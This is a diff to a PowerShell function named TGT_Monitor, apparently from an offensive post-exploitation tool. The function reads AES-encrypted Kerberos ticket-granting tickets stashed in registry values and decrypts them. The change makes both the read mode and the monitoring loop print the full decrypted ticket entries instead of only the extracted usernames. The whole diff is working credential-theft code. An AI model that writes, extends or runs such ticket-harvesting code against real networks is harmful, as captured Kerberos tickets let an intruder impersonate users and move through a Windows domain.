@@ -36,64 +36,40 @@ function TGT_Monitor {
 	}
 
 	# Check if the registry path exists and has properties before entering the loop
-	if($Read){
-		if (Test-Path $registryPath) {
-			$properties = Get-ItemProperty -Path $registryPath
-			if ($properties.PSObject.Properties.Count -gt 0) {
-				$properties.PSObject.Properties | Where-Object { $_.Name -like 'UniqueSection*' } | ForEach-Object {
-					# Assuming that the value is stored as a Base64 encoded byte array
-					$cleanBase64String = Clean-Base64String $_.Value
-					$encryptedBytesWithIV = [Convert]::FromBase64String($cleanBase64String)
-					try {
-						# Decrypt the value using the key and IV
-						$decryptedValue = ConvertFrom-SecureStringAES -encryptedStringWithIV $encryptedBytesWithIV -key $key -IV $IV
-						Write-Output ""
-						Write-Output $decryptedValue
-						Write-Output "====================================="
-					} catch {
-						Write-Error "An error occurred during decryption: $_"
-					}
-				}
-				
-				Write-Output "=================END================="
-				Write-Output "====================================="
-				Write-Output ""
-			}
-		}
-		
-		else{
-			Write-Output ""
-			Write-Output "[-] Empty Registry"
-			Write-Output ""
-			return
-		}
-		return
-	}
-	
-	else{
-		if (Test-Path $registryPath) {
-			Write-Output ""
-			Write-Output "Krb TGTs:"
-			Write-Output ""
-			$properties = Get-ItemProperty -Path $registryPath
-			$AllExtractedTGTs = $properties.PSObject.Properties | Where-Object { $_.Name -like 'UniqueSection*' } | ForEach-Object {
-				# Decrypt the value read from the registry
+	if (Test-Path $registryPath) {
+		$properties = Get-ItemProperty -Path $registryPath
+		if ($properties.PSObject.Properties.Count -gt 0) {
+			$properties.PSObject.Properties | Where-Object { $_.Name -like 'UniqueSection*' } | ForEach-Object {
+				# Assuming that the value is stored as a Base64 encoded byte array
 				$cleanBase64String = Clean-Base64String $_.Value
 				$encryptedBytesWithIV = [Convert]::FromBase64String($cleanBase64String)
 				try {
 					# Decrypt the value using the key and IV
 					$decryptedValue = ConvertFrom-SecureStringAES -encryptedStringWithIV $encryptedBytesWithIV -key $key -IV $IV
-					$decryptedValue = $decryptedValue -split "`r?`n" | Where-Object { $_ -match "Username" }
-					$decryptedValue = $decryptedValue -replace "UserName         : ",""
-					$decryptedValue
-				} catch {}
+					Write-Output $decryptedValue
+					Write-Output "====================================="
+				} catch {
+					Write-Error "An error occurred during decryption: $_"
+				}
 			}
 			
-			$AllExtractedTGTs | Sort-Object -Unique
-			
+			Write-Output "=================END================="
+			Write-Output "====================================="
 			Write-Output ""
 		}
 	}
+	
+	if($Read){
+ 		if (Test-Path $registryPath) {
+ 			return
+    		} 
+      		else{
+			Write-Output ""
+			Write-Output "[-] Empty Registry"
+			Write-Output ""
+   			return
+		}
+   	}
 	
 	if($Timeout){
  		$stopwatch = [System.Diagnostics.Stopwatch]::StartNew() # Start the stopwatch
@@ -204,25 +180,23 @@ function TGT_Monitor {
 		}
 		
 		if ($updated) {
-			Write-Output ""
-			Write-Output "Krb TGTs:"
-			Write-Output ""
 			$properties = Get-ItemProperty -Path $registryPath
-			$AllExtractedTGTs = $properties.PSObject.Properties | Where-Object { $_.Name -like 'UniqueSection*' } | ForEach-Object {
+			$properties.PSObject.Properties | Where-Object { $_.Name -like 'UniqueSection*' } | ForEach-Object {
 				# Decrypt the value read from the registry
 				$cleanBase64String = Clean-Base64String $_.Value
 				$encryptedBytesWithIV = [Convert]::FromBase64String($cleanBase64String)
 				try {
 					# Decrypt the value using the key and IV
 					$decryptedValue = ConvertFrom-SecureStringAES -encryptedStringWithIV $encryptedBytesWithIV -key $key -IV $IV
-					$decryptedValue = $decryptedValue -split "`r?`n" | Where-Object { $_ -match "Username" }
-					$decryptedValue = $decryptedValue -replace "UserName         : ",""
-					$decryptedValue
-				} catch {}
+					Write-Output $decryptedValue
+					Write-Output "====================================="
+				} catch {
+					Write-Error "An error occurred during decryption: $_"
+				}
 			}
 			
-			$AllExtractedTGTs | Sort-Object -Unique
-			
+			Write-Output "=================END================="
+			Write-Output "====================================="
 			Write-Output ""
 		}
 		
